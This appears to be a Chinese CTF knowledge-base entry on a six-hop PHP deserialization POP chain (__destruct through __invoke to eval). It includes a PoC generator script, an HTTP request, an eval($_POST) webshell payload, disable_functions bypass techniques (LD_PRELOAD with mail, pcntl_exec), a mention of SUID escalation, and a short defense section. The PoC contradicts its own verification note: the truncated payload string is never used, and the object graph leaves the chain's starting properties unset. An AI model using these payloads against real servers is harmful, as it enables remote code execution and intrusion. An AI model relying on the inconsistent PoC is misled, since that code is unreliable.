---
id: web-php-deserialization-destruct-set-tostring-get-isset-call-invoke-eval
title: 六跳 POP 链：__destruct 赋值触发 __set，echo 触发 __toString，读未定义属性触发 __get，isset 触发 __isset，调未定义方法触发 __call，最终进 __invoke 里 eval
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-destruct-set-tostring-get-isset-call-invoke-eval
aliases:
- __set 与 __isset 做跳板
- 六跳 POP 链
- die() 里赋值触发 __set
- __call 里调用属性当函数
- 反序列化 eval 落点
tags:
- php
- deserialization
- pop-chain
- magic-method
- isset
- eval
- disable-functions
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:52:13+08:00'
  notes: 已对照原文核对；本次核对未读取图片；lhRaMK7::__destruct 的 die(\->You->execurise=\->Do)、Parar::__set 的 echo \->lead、Starven::__toString 的 \->girl->abc、Parar::__get 的 file_get_contents(/flag) 与 isset(\->hansome->lover)、SYC::__isset 的 \->forever->nononon()、Starven::__call 的 \()、lhRaMK7::__invoke 的 eval(\->web) 以及 __wakeup 的 web=love，六跳链逐环与正文源码一致；已修正 PoC 中 base64_encode 应作用于截断后的串；禁用函数列表里无 eval 的判断与正文一致；PoC 未对真实目标执行
---

## 一句话结论

常规 POP 链只用到 `__destruct/__toString/__get/__invoke`，但当链上出现“给未定义属性赋值”“对未定义属性做 `isset`”“调用未定义方法”这三种动作时，`__set`、`__isset`、`__call` 就成为额外跳板。本题把六个魔术方法串成 `__destruct → __set → __toString → __get → __isset → __call → __invoke`，链尾 `eval($this->web)` 执行任意 PHP；`__wakeup` 里 `$this->web = $this->love` 让“属性注入”和“代码注入”解耦，禁用函数列表再长也拦不住 `eval`。

## 原理

- **魔术方法由“语言动作”触发，不由调用者显式指定**：给未定义/不可见属性赋值 → `__set`；`echo`/字符串上下文 → `__toString`；读未定义属性 → `__get`；对未定义属性 `isset()` → `__isset`；调未定义方法 → `__call`；对象当函数调用 → `__invoke`。一条链只要能把上一步的返回值/副作用接到下一步的动作上，就能无限延长。
- **本题六跳逐环落地**：
  1. `lhRaMK7::__destruct` 执行 `die($this->You->execurise = $this->Do)`：`$this->You` 是 `Parar` 对象，而 `execurise` 是 `private`，从外部赋值触发 `__set`；
  2. `Parar::__set` 里 `echo $this->lead`，`lead` 是 `Starven` 对象 → `__toString`；
  3. `Starven::__toString` 返回 `"...".$this->girl->abc`，`abc` 在 `Parar` 上未定义 → `__get`；
  4. `Parar::__get` 先尝试 `file_get_contents("/flag")`（可读则直接结束），不可读时走 `isset($this->hansome->lover)`：`hansome` 是 `SYC` 对象、`lover` 是 `private` → `__isset`；
  5. `SYC::__isset` 返回 `$this->forever->nononon()`，`nononon` 在 `Starven` 上不存在 → `__call`；
  6. `Starven::__call` 里 `$func = $this->friend; $func();`，`friend` 是 `lhRaMK7` 对象 → `__invoke`；
  7. `lhRaMK7::__invoke` 执行 `eval($this->web)`，而 `__wakeup` 已把 `web` 设成 `love` 的值。
- **`__wakeup` 的“赋值中转”是刻意设计**：`__wakeup(){ $this->web=$this->love; }` 让攻击者只填 `love` 即可，`web` 在序列化串里写成引用或留空都不影响；同时 `__destruct` 里的 `die(...)` 保证脚本结束前一定触发，不依赖 `unset`。
- **绕过 `disable_functions`**：列表里有 `exec,system,shell_exec,popen,proc_open,...` 但没有 `eval`（`eval` 是语言结构，无法被 `disable_functions` 禁用），因此只要落到 `eval`，禁函数列表形同虚设；实际利用中 `eval` 内容可先用 `$_POST` 动态取命令（本题用蚁剑插件做到免明文）。

## 触发条件

- 存在 `unserialize(base64_decode($_GET['x']))` 之类的入口，且链上类均可自动加载。
- 六个魔术方法齐全，且属性可见性（`private`/`public`）正好让“外部赋值/读取”落到 `__set`/`__get`/`__isset` 上。
- 链尾 sink 为 `eval`/`assert`/`include` 等不受 `disable_functions` 约束的原语。
- `__destruct` 或 `__wakeup` 会在请求内触发（`die`/`throw` 不影响析构执行）。

## 利用步骤

1. 读源码，列出所有魔术方法及其内部动作，标注每条边是“赋值/读取/isset/方法调用/字符串化”中的哪一种。
2. 从入口（`unserialize` 后自动触发的 `__destruct`/`__wakeup`）出发，正向串到 sink；`private` 属性导致的 `__set`/`__get`/`__isset` 往往是链上“隐藏跳板”。
3. 用 PHP 脚本按对象图构造并 `serialize()`；注意 `__wakeup` 里会把 `web` 用 `love` 覆盖，所以要把 payload 放在 `love`。
4. `base64_encode` 后放进 GET/POST 参数提交；先 `phpinfo()` 验证链通，再换成 `eval($_POST[...])` 或直接执行命令。
5. 落地 WebShell 后用蚁剑/自写脚本连（本题连接密码为 `1`），再做 SUID 提权。

## PoC

```php
<?php
class lhRaMK7 { public $Do; public $You; public $love; public $web; }
class Parar   { public $execurise; public $lead; public $hansome; }
class Starven { public $girl; public $friend; }
class SYC     { public $lover; public $forever; }

$a = new lhRaMK7();
$a->web  = &$a->You;                  // 链尾 eval 的内容走 __wakeup 的 love->web
$a->love = new Parar();
$a->love->lead = new Starven();
$a->love->lead->girl = new Parar();
$a->love->lead->girl->execurise = "man!";         // 通过 __get 里的 === 判断
$a->love->lead->girl->hansome = new SYC();
$a->love->lead->girl->hansome->forever = new Starven();
$a->love->lead->girl->hansome->forever->friend = new lhRaMK7();
$a->love->lead->girl->hansome->forever->friend->love = 'phpinfo();';

$payload = substr(serialize($a), 0, -1);   // 去掉末尾 } 便于手工拼接引用（按实际需要）
echo base64_encode(serialize($a)), "\n";
```

```text
GET /?Syclover=<base64(serialize)> HTTP/1.1
Host: target

# 打通后把 love 换成：
#   'eval("$_POST[1];");'
# 再用 POST 参数 1=<php code> 执行任意代码
```

说明：PoC 按原文构造脚本与最终 payload 结构还原，未对真实目标执行；`$a->web = &$a->You` 与 `substr(...,0,-1)` 是原文为构造引用/截断串所用的技巧，实际生成建议直接用 `serialize()` 输出并用引用语法 `R:` 校正。

## 变体与关联

- **跳板替换**：`__set`→`__get`（读私有属性）、`__isset`→`__unset`、`__call`→`__callStatic`（静态上下文）、`__toString`→`__debugInfo`（`var_dump` 触发）。
- **链尾替换**：`eval`→`assert`/`include`/`create_function`/`preg_replace /e`/`call_user_func`；也可换成文件写入（`file_put_contents`）落 WebShell。
- **禁函数绕过**：`eval` 不受 `disable_functions` 影响；其它可用 `pcntl_exec`（常被忽略）、`imap_open`（旧版）、`LD_PRELOAD`+`mail()`、`putenv`+`error_log` 等。
- **关联**：`web-php-deserialization-destruct-tostring-get-invoke-call-user-func`（四跳版本，缺 `__set`/`__isset`）、`web-php-deserialization-wakeup-pregmatch-tostring-get-invoke-read`（`__wakeup` 起手 + `preg_match` 过滤的变体）、`web-php-rce-ifs-space-bypass-command-injection`（落地后的命令构造）。
- **边界**：`__get` 里若 `/flag` 可读会提前 `return`（本题正是这样，出题人留的“捷径”）；属性改成 `public` 会让 `__set`/`__get`/`__isset` 不再触发，链断；`allowed_classes` 白名单或签名校验会让入口失效。

## 检测与防御

- **代码层**：`__destruct`/`__wakeup` 里不要做属性赋值给其它对象（尤其 `die($obj->prop = ...)` 这种写法）；`__toString`/`__get`/`__isset`/`__call` 里禁止 `echo` 对象、禁止 `$this->x->y()`、禁止 `eval`。
- **反序列化**：`unserialize($s, ['allowed_classes' => [...]])` 白名单 + HMAC 签名；对象传输改 JSON。
- **执行面**：`disable_functions` 覆盖命令执行族，同时用 `open_basedir`、只读 Web 目录、SELinux/AppArmor 限制；`eval` 无法禁用，因此必须在代码层消除 sink。
- **检测**：请求参数出现 `base64` 长串且解码后含 `O:`/`s:`/`__wakeup`；`Syclover`/`data`/`payload` 类参数高频提交；Web 目录新增 PHP 文件且内容含 `eval($_POST`；`phpinfo()` 被异常调用。
